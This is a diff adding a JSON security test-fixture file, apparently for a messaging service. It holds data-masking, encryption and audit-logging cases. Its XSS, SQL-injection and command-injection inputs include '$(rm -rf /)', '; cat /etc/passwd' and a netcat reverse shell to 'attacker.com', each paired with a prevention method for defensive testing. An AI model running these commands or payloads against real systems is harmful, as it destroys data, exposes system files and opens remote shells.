@@ -1,0 +1,194 @@
+{
+  "dataToMask": [
+    {
+      "type": "phoneNumber",
+      "original": "+94712345678",
+      "masked": "+947****5678",
+      "maskPattern": "show first 4 and last 4 digits"
+    },
+    {
+      "type": "phoneNumber",
+      "original": "0912345678",
+      "masked": "09****5678",
+      "maskPattern": "show first 2 and last 4 digits"
+    },
+    {
+      "type": "token",
+      "original": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0SflKSMGQpojqstLBF6Z77w5QAMA",
+      "masked": "eyJhbGci...qstLBF6Z77w5QAMA",
+      "maskPattern": "show first 10 and last 20 chars"
+    },
+    {
+      "type": "email",
+      "original": "user@example.com",
+      "masked": "u***@example.com",
+      "maskPattern": "show first 1 and domain"
+    },
+    {
+      "type": "accountId",
+      "original": "account-longid-12345678",
+      "masked": "account-...5678",
+      "maskPattern": "show first 8 and last 4 chars"
+    }
+  ],
+  "encryptionTestCases": [
+    {
+      "plaintext": "This is a secret message",
+      "description": "Regular message encryption",
+      "shouldEncrypt": true,
+      "encryptionMethod": "AES-256"
+    },
+    {
+      "plaintext": "User password: MySecurePassword123!",
+      "description": "Password encryption",
+      "shouldEncrypt": true,
+      "encryptionMethod": "bcrypt"
+    },
+    {
+      "plaintext": "{\"phoneNumber\": \"+94712345678\", \"accountId\": \"acc-001\"}",
+      "description": "JSON data encryption",
+      "shouldEncrypt": true,
+      "encryptionMethod": "AES-256"
+    },
+    {
+      "plaintext": "API Key: sk_live_51234567890abcdef",
+      "description": "API key encryption",
+      "shouldEncrypt": true,
+      "encryptionMethod": "AES-256"
+    }
+  ],
+  "xssTestCases": [
+    {
+      "input": "<script>alert('xss')</script>",
+      "context": "message body",
+      "expected": "sanitized or escaped",
+      "vulnerable": true,
+      "testType": "script injection"
+    },
+    {
+      "input": "<img src=x onerror=alert('xss')>",
+      "context": "message attachment",
+      "expected": "sanitized or escaped",
+      "vulnerable": true,
+      "testType": "event handler injection"
+    },
+    {
+      "input": "javascript:alert('xss')",
+      "context": "URL",
+      "expected": "sanitized or escaped",
+      "vulnerable": true,
+      "testType": "protocol injection"
+    },
+    {
+      "input": "<input onfocus=alert('xss') autofocus>",
+      "context": "form field",
+      "expected": "sanitized or escaped",
+      "vulnerable": true,
+      "testType": "form injection"
+    }
+  ],
+  "sqlInjectionTestCases": [
+    {
+      "input": "1' OR '1'='1",
+      "query": "SELECT * FROM users WHERE id = ?",
+      "context": "user id lookup",
+      "vulnerable": true,
+      "preventionMethod": "parameterized query or prepared statement"
+    },
+    {
+      "input": "admin' --",
+      "query": "SELECT * FROM users WHERE username = ? AND password = ?",
+      "context": "login form",
+      "vulnerable": true,
+      "preventionMethod": "parameterized query"
+    },
+    {
+      "input": "1'; DROP TABLE users--",
+      "query": "SELECT * FROM users WHERE id = ?",
+      "context": "destructive injection",
+      "vulnerable": true,
+      "preventionMethod": "parameterized query + principle of least privilege"
+    },
+    {
+      "input": "1' UNION SELECT NULL--",
+      "query": "SELECT * FROM users WHERE id = ?",
+      "context": "data extraction",
+      "vulnerable": true,
+      "preventionMethod": "parameterized query"
+    }
+  ],
+  "commandInjectionTestCases": [
+    {
+      "input": "$(rm -rf /)",
+      "context": "system command execution",
+      "vulnerable": true,
+      "preventionMethod": "avoid shell execution, use API calls instead"
+    },
+    {
+      "input": "; cat /etc/passwd",
+      "context": "command chaining",
+      "vulnerable": true,
+      "preventionMethod": "escape shell metacharacters"
+    },
+    {
+      "input": "| nc -e /bin/sh attacker.com 4444",
+      "context": "pipe to reverse shell",
+      "vulnerable": true,
+      "preventionMethod": "strict input validation, no shell access"
+    },
+    {
+      "input": "` whoami `",
+      "context": "command substitution",
+      "vulnerable": true,
+      "preventionMethod": "avoid backtick execution, use API instead"
+    }
+  ],
+  "auditLoggingScenarios": [
+    {
+      "event": "LOGIN",
+      "accountId": "account-001",
+      "timestamp": "2024-01-15T10:30:00Z",
+      "details": "User logged in from IP 192.168.1.1",
+      "shouldLog": true,
+      "sensitive": true
+    },
+    {
+      "event": "PASSWORD_CHANGE",
+      "accountId": "account-001",
+      "timestamp": "2024-01-15T10:35:00Z",
+      "details": "Password changed (old hash should NOT be logged, only action)",
+      "shouldLog": true,
+      "sensitive": true,
+      "maskFields": ["oldPasswordHash", "newPasswordHash"]
+    },
+    {
+      "event": "ACCOUNT_DELETE",
+      "accountId": "account-002",
+      "deletedByAccountId": "account-001",
+      "timestamp": "2024-01-15T10:40:00Z",
+      "details": "Account deleted by admin",
+      "shouldLog": true,
+      "sensitive": false
+    },
+    {
+      "event": "DATA_ACCESS",
+      "accountId": "account-001",
+      "accessedDataType": "phone_numbers",
+      "count": 150,
+      "timestamp": "2024-01-15T10:45:00Z",
+      "details": "150 phone numbers accessed",
+      "shouldLog": true,
+      "sensitive": false
+    },
+    {
+      "event": "FAILED_AUTHORIZATION",
+      "accountId": "account-002",
+      "attemptedAction": "DELETE_ACCOUNT",
+      "targetAccountId": "account-001",
+      "timestamp": "2024-01-15T10:50:00Z",
+      "details": "Secondary account attempted to delete another account",
+      "shouldLog": true,
+      "sensitive": true
+    }
+  ]
+}
